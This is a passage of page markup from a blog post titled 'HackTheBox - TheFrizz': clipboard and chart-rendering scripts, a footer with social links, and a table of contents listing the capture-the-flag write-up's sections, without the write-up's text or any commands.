      newElemOuter.append(newElemInner);
      elem.append(newElemOuter);

      elem.addEventListener('mouseenter', function() {
        this.querySelector('.anchor').classList.remove('hide');
      });
      elem.addEventListener('mouseleave', function () {
        this.querySelector('.anchor').classList.add('hide');
      });
    }) : null;

    document.querySelectorAll('.anchor').forEach(function(elem) {
      elem.addEventListener('mouseleave', function() {
        elem.setAttribute('aria-label', null);
        elem.classList.remove('tooltipped');
        elem.classList.remove('tooltipped-s');
        elem.classList.remove('tooltipped-w');
      });
    });

    clip.on('success', function (e) {
      e.clearSelection();
      e.trigger.setAttribute('aria-label', 'Link copied to clipboard!');
      e.trigger.classList.add('tooltipped');
      e.trigger.classList.add('tooltipped-s');
    });
    


    
    var clipInit = false;
    var preChromaElem = document.querySelectorAll('pre.chroma');
    var langCodeElem = document.querySelectorAll('.language-code');
    var dollarCodeElem = document.querySelectorAll('div.language-\\$');
    var gtCodeElem = document.querySelectorAll('div.language-\\>');

    var makeClipboard = function(elem) {
      var code = elem,
        text = elem.textContent;
        
      if (text.length > 15) {
        if (!clipInit) {
          var text, clip = new ClipboardJS('.copy-to-clipboard', {
            text: function (trigger) {
              var codeElem = prev(trigger).querySelectorAll('code');
              if (codeElem.length > 1) {
                text = prev(trigger).querySelector('code[class^="language-"]').textContent;
              } else {
                text = prev(trigger).querySelector('code').textContent;
              }

              return text.replace(/^\$\s/gm, '');
            }
          });

          var inPre;
          clip.on('success', function (e) {
            e.clearSelection();
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', 'Copied to clipboard!');
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clip.on('error', function (e) {
            inPre = prop(e.trigger.parentNode, 'tagName') == 'PRE';
            e.trigger.setAttribute('aria-label', e.action.toString());
            e.trigger.classList.add('tooltipped');
            e.trigger.classList.add('tooltipped-w');
          });

          clipInit = true;
        }

        var notAllowedClass = ['language-mermaid', 'language-viz', 'language-wave', 'language-chart', 'language-msc', 'language-flowchart'];
        var isNotAllowedIncluded = false;
        var curClassName = code.getAttribute('class');

        for (var i = 0; i < notAllowedClass.length; i++) {
          if (curClassName && curClassName.startsWith(notAllowedClass[i])) {
            isNotAllowedIncluded = true;
            break;
          }
        }

        if (!isNotAllowedIncluded) {
          if (curClassName) {
            var newClipboardElem = document.createElement('span');
            newClipboardElem.setAttribute('class', 'copy-to-clipboard');
            newClipboardElem.setAttribute('title', 'Copy to clipboard');
            elem.parentNode.parentNode.insertBefore(newClipboardElem, elem.parentNode.nextElementSibling);
          }
        }
      }
    }

    var makeSymbolClipboard = function(elem) {
      var clipboardSpan = document.createElement('span');
      clipboardSpan.setAttribute('class', 'copy-to-clipboard');
      clipboardSpan.setAttribute('title', 'Copy to clipboard');
      elem.parentNode.parentNode.insertBefore(clipboardSpan, elem.parentNode.nextElementSibling);
    }

    preChromaElem ? 
    preChromaElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function(codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;
    
    langCodeElem ? 
    langCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeClipboard(codeElem);
      });
    }) : null;

    dollarCodeElem ? 
    dollarCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;

    gtCodeElem ?
    gtCodeElem.forEach(function(elem) {
      elem.querySelectorAll('code').forEach(function (codeElem) {
        makeSymbolClipboard(codeElem);
      });
    }) : null;
    


    
    dollarCodeElem ?
    dollarCodeElem.forEach(function(elem) {
      var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
      lnts ? 
      lnts.forEach(function(lnt) {
        lnt.innerHTML = '$<br/>';
      }) : null;
    }) : null;

    gtCodeElem ?
    gtCodeElem.forEach(function(elem) {
      var lnts = elem.parentNode.parentNode ? elem.parentNode.parentNode.querySelectorAll('.lnt') : null;
      lnts ? 
      lnts.forEach(function(lnt) {
        lnt.innerHTML = '><br/>';
      }) : null;
    }) : null;
    


    
    
    var lib = JSON.parse("[\"chart\"]");

    if (lib && lib.includes('mermaid')) {
      
      var themeVariant = localStorage.getItem('theme') || JSON.parse("\"dark\"");

      if (themeVariant === "dark" || themeVariant === "hacker") {
        mermaid.initialize({ theme: 'dark' });
      } else {
        mermaid.initialize({ theme: 'default' });
      }
      
      var mermaids = [];
      [].push.apply(mermaids, document.getElementsByClassName('language-mermaid'));
      mermaids.forEach(function(elem) {
        var elemParentNode = elem.parentNode;

        if (elemParentNode !== document.body) {
          elemParentNode.parentNode.insertBefore(elem, elemParentNode);
          elemParentNode.parentNode.removeChild(elemParentNode);
        }

        var newElemWrapper = document.createElement('div');
        newElemWrapper.classList.add('mermaid');
        newElemWrapper.style.padding = '34px 4px 6px';
        newElemWrapper.innerHTML = elem.innerHTML;
        elem.replaceWith(newElemWrapper);
      });
    }
    
    

    
    if (lib && lib.includes('katex')) {
      var mathElements = document.getElementsByClassName('math');
      var options = {
        delimiters: [
          { left: "$$", right: "$$", display: true },
          { left: "\\[", right: "\\]", display: true },
          { left: "$", right: "$", display: false },
          { left: "\\(", right: "\\)", display: false }
        ],
      };

      renderMathInElement(document.querySelector('.single__contents'), options);
    }
    


    
    if (lib && lib.includes('flowchartjs')) {
      
      var options = JSON.parse("{\"arrow-end\":\"block\",\"element-color\":\"black\",\"fill\":\"white\",\"flowstate\":{\"approved\":{\"fill\":\"#58C4A3\",\"font-size\":12,\"no-text\":\"n/a\",\"yes-text\":\"APPROVED\"},\"current\":{\"fill\":\"yellow\",\"font-color\":\"red\",\"font-weight\":\"bold\"},\"future\":{\"fill\":\"#FFFF99\"},\"invalid\":{\"fill\":\"#444444\"},\"past\":{\"fill\":\"#CCCCCC\",\"font-size\":12},\"rejected\":{\"fill\":\"#C45879\",\"font-size\":12,\"no-text\":\"REJECTED\",\"yes-text\":\"n/a\"},\"request\":{\"fill\":\"blue\"}},\"font-color\":\"black\",\"font-size\":14,\"line-color\":\"black\",\"line-length\":50,\"line-width\":3,\"no-text\":\"no\",\"scale\":1,\"symbols\":{\"end\":{\"class\":\"end-element\"},\"start\":{\"element-color\":\"green\",\"fill\":\"yellow\",\"font-color\":\"red\"}},\"text-margin\":10,\"x\":0,\"y\":0,\"yes-text\":\"yes\"}");
      var jsonContent = null;

      var flowchartPrefix = "language-flowchart";
      var index = 0;
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + flowchartPrefix + "]"), function(x){
          x.style.display = 'none'
          x.parentNode.style.backgroundColor = "transparent"
          jsonContent = x.innerText;

          var node0 = document.createElement('div');
          node0.id = 'flowchart' + index;
          x.parentNode.insertBefore(node0, x);

          var diagram = flowchart.parse(jsonContent);
          diagram.drawSVG("flowchart"+index, options);

          index +=1;
      });      
    }
    


    
    


    
    if (lib && lib.includes('msc')) {
      
      var options = JSON.parse("{\"theme\":\"hand\"}");
      var jsonContent = null;

      var index = 0;
      var chartPrefix = "language-msc";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        node0.id = 'msc' + index;
        x.parentNode.insertBefore(node0, x);
        var diagram = Diagram.parse(jsonContent);
        diagram.drawSVG("msc" + index, options);
        index += 1;
      });
    }
    


    
    if (lib && lib.includes('chart')) {
      var borderColor = "rgba(0,0,0,0)";
      var bgColor = "rgba(0,0,0,0)  ";
      var borderWidth = 2;

      Chart.defaults.global.elements.rectangle.borderWidth = borderWidth;
      Chart.defaults.global.elements.rectangle.borderColor = borderColor;
      Chart.defaults.global.elements.rectangle.backgroundColor = bgColor;

      Chart.defaults.global.elements.line.borderWidth = borderWidth;
      Chart.defaults.global.elements.line.borderColor = borderColor;
      Chart.defaults.global.elements.line.backgroundColor = bgColor;

      Chart.defaults.global.elements.point.borderWidth = borderWidth;
      Chart.defaults.global.elements.point.borderColor = borderColor;
      Chart.defaults.global.elements.point.backgroundColor = bgColor;

      var chartPrefix = "language-chart";
      var index = 0;
      var jsonContent = null;

      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + chartPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('canvas');
        var source = null;
        node0.height = 200;
        node0.style.height = 200;
        node0.id = 'myChart' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        var ctx = document.getElementById('myChart' + index).getContext('2d');
        var myChart = new Chart(ctx, source);
        console.log(source);
        index += 1;
      });            
    }
    


    
    if (lib && lib.includes('wavedrom')) {
      var wavePrefix = "language-wave";
      var index = 0;
      var jsonContent = null;
      
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + wavePrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        jsonContent = x.innerText;
        var node0 = document.createElement('div');
        var source = null;
        node0.id = 'WaveDrom_Display_' + index;
        source = JSON.parse(jsonContent);
        x.parentNode.insertBefore(node0, x);
        WaveDrom.RenderWaveForm(index, source, "WaveDrom_Display_");
        index += 1;
      });
    }
    


    
    if (lib && lib.includes('viz')) {
      var vizPrefix = "language-viz-";
      Array.prototype.forEach.call(document.querySelectorAll("[class^=" + vizPrefix + "]"), function (x) {
        x.style.display = 'none'
        x.parentNode.style.backgroundColor = "transparent"
        var engine;
        x.getAttribute("class").split(" ").forEach(function (cls) {
          if (cls.startsWith(vizPrefix)) {
            engine = cls.substr(vizPrefix.length);
          }
        });
        var viz = new Viz();
        viz.renderSVGElement(x.innerText, { engine: engine })
          .then(function (element) {
            element.style.width = "100%";
            x.parentNode.insertBefore(element, x);
          })
      });
    }
    
    
  }
</script>


            
            <footer class="footer">
    
<div class="dropdown">
  <button class="dropdown-trigger" aria-label="Select Theme Button">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><path fill="currentColor" d="M12.65 15.67c.14-.36.05-.77-.23-1.05l-2.09-2.06.03-.03c1.74-1.94 2.98-4.17 3.71-6.53h1.94c.54 0 .99-.45.99-.99v-.02c0-.54-.45-.99-.99-.99H10V3c0-.55-.45-1-1-1s-1 .45-1 1v1H1.99c-.54 0-.99.45-.99.99 0 .55.45.99.99.99h10.18C11.5 7.92 10.44 9.75 9 11.35c-.81-.89-1.49-1.86-2.06-2.88-.16-.29-.45-.47-.78-.47-.69 0-1.13.75-.79 1.35.63 1.13 1.4 2.21 2.3 3.21L3.3 16.87c-.4.39-.4 1.03 0 1.42.39.39 1.02.39 1.42 0L9 14l2.02 2.02c.51.51 1.38.32 1.63-.35zM17.5 10c-.6 0-1.14.37-1.35.94l-3.67 9.8c-.24.61.22 1.26.87 1.26.39 0 .74-.24.88-.61l.89-2.39h4.75l.9 2.39c.14.36.49.61.88.61.65 0 1.11-.65.88-1.26l-3.67-9.8c-.22-.57-.76-.94-1.36-.94zm-1.62 7l1.62-4.33L19.12 17h-3.24z"/></svg>
  </button>
  <div class="dropdown-content">
    
    
    
      
      
        
        
          
            
              <a href="https://sckull.github.io/posts/thefrizz/" data-lang="es" class="dropdown-item is-active">EspaÃ±ol</a>
            
          
        
      
        
      
    
  </div>
</div>

    
<div class="footer__social">
  <div class="social">
    
            
    
      
      <a href="https://discordapp.com/users/560543197466722314" title="discord" aria-label="discord">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 512 512" aria-label="Discord" version="1.1"> 
 <path d="m386 137c-24-11-49.5-19-76.3-23.7c-.5 0-1 0-1.2.6c-3.3 5.9-7 13.5-9.5 19.5c-29-4.3-57.5-4.3-85.7 0c-2.6-6.2-6.3-13.7-10-19.5c-.3-.4-.7-.7-1.2-.6c-23 4.6-52.4 13-76 23.7c-.2 0-.4.2-.5.4c-49 73-62 143-55 213c0 .3.2.7.5 1c32 23.6 63 38 93.6 47.3c.5 0 1 0 1.3-.4c7.2-9.8 13.6-20.2 19.2-31.2c.3-.6 0-1.4-.7-1.6c-10-4-20-8.6-29.3-14c-.7-.4-.8-1.5 0-2c2-1.5 4-3 5.8-4.5c.3-.3.8-.3 1.2-.2c61.4 28 128 28 188 0c.4-.2.9-.1 1.2.1c1.9 1.6 3.8 3.1 5.8 4.6c.7.5.6 1.6 0 2c-9.3 5.5-19 10-29.3 14c-.7.3-1 1-.6 1.7c5.6 11 12.1 21.3 19 31c.3.4.8.6 1.3.4c30.6-9.5 61.7-23.8 93.8-47.3c.3-.2.5-.5.5-1c7.8-80.9-13.1-151-55.4-213c0-.2-.3-.4-.5-.4Zm-192 171c-19 0-34-17-34-38c0-21 15-38 34-38c19 0 34 17 34 38c0 21-15 38-34 38zm125 0c-19 0-34-17-34-38c0-21 15-38 34-38c19 0 34 17 34 38c0 21-15 38-34 38z" fill="currentColor"/>
</svg>
      </a>
            
    
            
    
            
    
      
      <a href="https://github.com/sckull" title="github" aria-label="github">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 24 24" version="1.1">
<g id="surface3680">
<path fill="currentColor" d="M 10.898438 2.101562 C 6.300781 2.601562 2.601562 6.300781 2.101562 10.800781 C 1.601562 15.5 4.300781 19.699219 8.398438 21.300781 C 8.699219 21.398438 9 21.199219 9 20.800781 L 9 19.199219 C 9 19.199219 8.601562 19.300781 8.101562 19.300781 C 6.699219 19.300781 6.101562 18.101562 6 17.398438 C 5.898438 17 5.699219 16.699219 5.398438 16.398438 C 5.101562 16.300781 5 16.300781 5 16.199219 C 5 16 5.300781 16 5.398438 16 C 6 16 6.5 16.699219 6.699219 17 C 7.199219 17.800781 7.800781 18 8.101562 18 C 8.5 18 8.800781 17.898438 9 17.800781 C 9.101562 17.101562 9.398438 16.398438 10 16 C 7.699219 15.5 6 14.199219 6 12 C 6 10.898438 6.5 9.800781 7.199219 9 C 7.101562 8.800781 7 8.300781 7 7.601562 C 7 7.199219 7 6.601562 7.300781 6 C 7.300781 6 8.699219 6 10.101562 7.300781 C 10.601562 7.101562 11.300781 7 12 7 C 12.699219 7 13.398438 7.101562 14 7.300781 C 15.300781 6 16.800781 6 16.800781 6 C 17 6.601562 17 7.199219 17 7.601562 C 17 8.398438 16.898438 8.800781 16.800781 9 C 17.5 9.800781 18 10.800781 18 12 C 18 14.199219 16.300781 15.5 14 16 C 14.601562 16.5 15 17.398438 15 18.300781 L 15 20.898438 C 15 21.199219 15.300781 21.5 15.699219 21.398438 C 19.398438 19.898438 22 16.300781 22 12.101562 C 22 6.101562 16.898438 1.398438 10.898438 2.101562 Z M 10.898438 2.101562 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
            
    
      
      <a href="https://t.me/sckull" title="telegram" aria-label="telegram">
        <svg data-name="telegram" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32" width="32" height="32"><path fill="currentColor" d="M 26.070313 3.996094 C 25.734375 4.011719 25.417969 4.109375 25.136719 4.21875 L 25.132813 4.21875 C 24.847656 4.332031 23.492188 4.902344 21.433594 5.765625 C 19.375 6.632813 16.703125 7.757813 14.050781 8.875 C 8.753906 11.105469 3.546875 13.300781 3.546875 13.300781 L 3.609375 13.277344 C 3.609375 13.277344 3.25 13.394531 2.875 13.652344 C 2.683594 13.777344 2.472656 13.949219 2.289063 14.21875 C 2.105469 14.488281 1.957031 14.902344 2.011719 15.328125 C 2.101563 16.050781 2.570313 16.484375 2.90625 16.722656 C 3.246094 16.964844 3.570313 17.078125 3.570313 17.078125 L 3.578125 17.078125 L 8.460938 18.722656 C 8.679688 19.425781 9.949219 23.597656 10.253906 24.558594 C 10.433594 25.132813 10.609375 25.492188 10.828125 25.765625 C 10.933594 25.90625 11.058594 26.023438 11.207031 26.117188 C 11.265625 26.152344 11.328125 26.179688 11.390625 26.203125 C 11.410156 26.214844 11.429688 26.21875 11.453125 26.222656 L 11.402344 26.210938 C 11.417969 26.214844 11.429688 26.226563 11.441406 26.230469 C 11.480469 26.242188 11.507813 26.246094 11.558594 26.253906 C 12.332031 26.488281 12.953125 26.007813 12.953125 26.007813 L 12.988281 25.980469 L 15.871094 23.355469 L 20.703125 27.0625 L 20.8125 27.109375 C 21.820313 27.550781 22.839844 27.304688 23.378906 26.871094 C 23.921875 26.433594 24.132813 25.875 24.132813 25.875 L 24.167969 25.785156 L 27.902344 6.65625 C 28.007813 6.183594 28.035156 5.742188 27.917969 5.3125 C 27.800781 4.882813 27.5 4.480469 27.136719 4.265625 C 26.769531 4.046875 26.40625 3.980469 26.070313 3.996094 Z M 25.96875 6.046875 C 25.964844 6.109375 25.976563 6.101563 25.949219 6.222656 L 25.949219 6.234375 L 22.25 25.164063 C 22.234375 25.191406 22.207031 25.25 22.132813 25.308594 C 22.054688 25.371094 21.992188 25.410156 21.667969 25.28125 L 15.757813 20.75 L 12.1875 24.003906 L 12.9375 19.214844 C 12.9375 19.214844 22.195313 10.585938 22.59375 10.214844 C 22.992188 9.84375 22.859375 9.765625 22.859375 9.765625 C 22.886719 9.3125 22.257813 9.632813 22.257813 9.632813 L 10.082031 17.175781 L 10.078125 17.15625 L 4.242188 15.191406 L 4.242188 15.1875 C 4.238281 15.1875 4.230469 15.183594 4.226563 15.183594 C 4.230469 15.183594 4.257813 15.171875 4.257813 15.171875 L 4.289063 15.15625 L 4.320313 15.144531 C 4.320313 15.144531 9.53125 12.949219 14.828125 10.71875 C 17.480469 9.601563 20.152344 8.476563 22.207031 7.609375 C 24.261719 6.746094 25.78125 6.113281 25.867188 6.078125 C 25.949219 6.046875 25.910156 6.046875 25.96875 6.046875 Z"/></svg>
      </a>
            
    
            
    
      
      <a href="https://twitter.com/sckull_" title="twitter" aria-label="twitter">
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="32" height="32" viewBox="0 0 32 32" version="1.1">
<g id="surface676">
<path fill="currentColor" d="M 28 8.558594 C 27.117188 8.949219 26.167969 9.214844 25.171875 9.332031 C 26.1875 8.722656 26.96875 7.757812 27.335938 6.609375 C 26.386719 7.171875 25.332031 7.582031 24.210938 7.804688 C 23.3125 6.847656 22.03125 6.246094 20.617188 6.246094 C 17.898438 6.246094 15.691406 8.453125 15.691406 11.171875 C 15.691406 11.558594 15.734375 11.933594 15.820312 12.292969 C 11.726562 12.089844 8.097656 10.128906 5.671875 7.148438 C 5.246094 7.875 5.003906 8.722656 5.003906 9.625 C 5.003906 11.332031 5.871094 12.839844 7.195312 13.722656 C 6.386719 13.695312 5.628906 13.476562 4.964844 13.105469 C 4.964844 13.128906 4.964844 13.148438 4.964844 13.167969 C 4.964844 15.554688 6.660156 17.546875 8.914062 17.996094 C 8.5 18.109375 8.066406 18.171875 7.617188 18.171875 C 7.300781 18.171875 6.988281 18.140625 6.691406 18.082031 C 7.316406 20.039062 9.136719 21.460938 11.289062 21.503906 C 9.605469 22.824219 7.480469 23.609375 5.175781 23.609375 C 4.777344 23.609375 4.386719 23.585938 4 23.539062 C 6.179688 24.9375 8.765625 25.753906 11.546875 25.753906 C 20.605469 25.753906 25.558594 18.25 25.558594 11.742188 C 25.558594 11.53125 25.550781 11.316406 25.542969 11.105469 C 26.503906 10.410156 27.339844 9.542969 28 8.558594 Z M 28 8.558594 "/>
</g>
</svg>

      </a>
            
    
            
    
            
    
            
    
            
    
    
  
  
    
      <a href="https://sckull.github.io/posts//index.xml" type="application/rss+xml" title="RSS" aria-label="RSS Feed Link">
        <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" d="M0 0h24v24H0V0z"/><circle fill="currentColor" cx="6.18" cy="17.82" r="2.18"/><path fill="currentColor" d="M5.59 10.23c-.84-.14-1.59.55-1.59 1.4 0 .71.53 1.28 1.23 1.4 2.92.51 5.22 2.82 5.74 5.74.12.7.69 1.23 1.4 1.23.85 0 1.54-.75 1.41-1.59-.68-4.2-3.99-7.51-8.19-8.18zm-.03-5.71C4.73 4.43 4 5.1 4 5.93c0 .73.55 1.33 1.27 1.4 6.01.6 10.79 5.38 11.39 11.39.07.73.67 1.28 1.4 1.28.84 0 1.5-.73 1.42-1.56-.73-7.34-6.57-13.19-13.92-13.92z"/></svg>
      </a>
    
  

  </div>
</div>

    
<div id="gtt">
  <div class="gtt">
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M8.12 14.71L12 10.83l3.88 3.88c.39.39 1.02.39 1.41 0 .39-.39.39-1.02 0-1.41L12.7 8.71c-.39-.39-1.02-.39-1.41 0L6.7 13.3c-.39.39-.39 1.02 0 1.41.39.38 1.03.39 1.42 0z"/></svg>
  </div>
</div>

    <hr />

    <div class="basicflex">
        
    </div>

    <div class="footer__poweredby">
        
                
            <p class="caption">
                
                    
                        Â©2026, All Rights Reserved
                    
                
            </p>
        

        
            <p class="caption">SGVsbG8gV29ybGQh</p>
            
        
        
    </div> 
</footer>
<script>

var a = document.getElementsByClassName('navbar__menu-item') 
    var n = 0;
    for (var i = 1; i < a.length; i++) {
        n += i;
        a[i].classList.add("glitch_navbar");        
        a[i].style= "--content: '"+a[i].textContent.replace(/\s/g, '')+"';"
        
        
        
    }

</script>
        </div>
        





<div class="wrapper__right hide" data-pad="true" dir="ltr">
  <script>document.querySelector('.wrapper__right').classList.remove('hide')</script>
  
    
      
        <div class="toc__flexbox--outer" data-position="fixed" data-dir="ltr" data-ani="true">
          <h6 class="toc__title toc__title--outer" data-ani="true">
            
            
              <a href="#title__single">HackTheBox - TheFrizz</a>
            
            
          </h6>
          
          <label class="switch" data-ani="true">
            <input id="visible-toc" aria-label="Visible TOC" type="checkbox" checked>
            <span class="slider round"></span>
          </label>
          
        </div>
        <div class="toc toc__outer " data-dir="ltr" data-folding="false" data-ani="true">
          <nav id="TableOfContents">
  <ul>
    <li><a href="#recon">Recon</a>
      <ul>
        <li><a href="#nmap">nmap</a></li>
        <li><a href="#smb">SMB</a></li>
        <li><a href="#web-site">Web Site</a></li>
      </ul>
    </li>
    <li><a href="#gibbon-v25000">Gibbon v25.0.00</a>
      <ul>
        <li><a href="#analysis---gibbon-repo">Analysis - Gibbon Repo</a></li>
        <li><a href="#upload-files---fail">Upload Files - Fail</a></li>
        <li><a href="#dangerous-functions">Dangerous Functions</a></li>
        <li><a href="#creating-a-file">Creating a File</a></li>
        <li><a href="#command-execution">Command Execution</a></li>
      </ul>
    </li>
    <li><a href="#user---wwebservice">User - w.webservice</a>
      <ul>
        <li><a href="#port-forwarding---chisel">Port Forwarding - Chisel</a></li>
        <li><a href="#gibbon-database">Gibbon Database</a></li>
        <li><a href="#cracking-the-hash">Cracking the Hash</a></li>
      </ul>
    </li>
    <li><a href="#user---ffrizzle">User - f.frizzle</a>
      <ul>
        <li><a href="#bloodhound">Bloodhound</a>
          <ul>
            <li><a href="#ffrizzle">F.Frizzle</a></li>
            <li><a href="#m-schoolbus">M SchoolBus</a></li>
          </ul>
        </li>
        <li><a href="#shell---ssh-kerberos">Shell - SSH Kerberos</a></li>
      </ul>
    </li>
    <li><a href="#user---mschoolbus">User - M.SchoolBus</a>
      <ul>
        <li><a href="#backup">Backup</a></li>
        <li><a href="#password-spraying">Password Spraying</a></li>
        <li><a href="#shell">Shell</a></li>
      </ul>
    </li>
    <li><a href="#privesc">Privesc</a>
      <ul>
        <li><a href="#gpo-abuse">GPO Abuse</a></li>
        <li><a href="#shell-1">Shell</a></li>
        <li><a href="#dump-hashes">Dump Hashes</a></li>
      </ul>
    </li>
  </ul>
</nav>          
        </div>
      
    
  
</div>

    </div>
</body>

</html>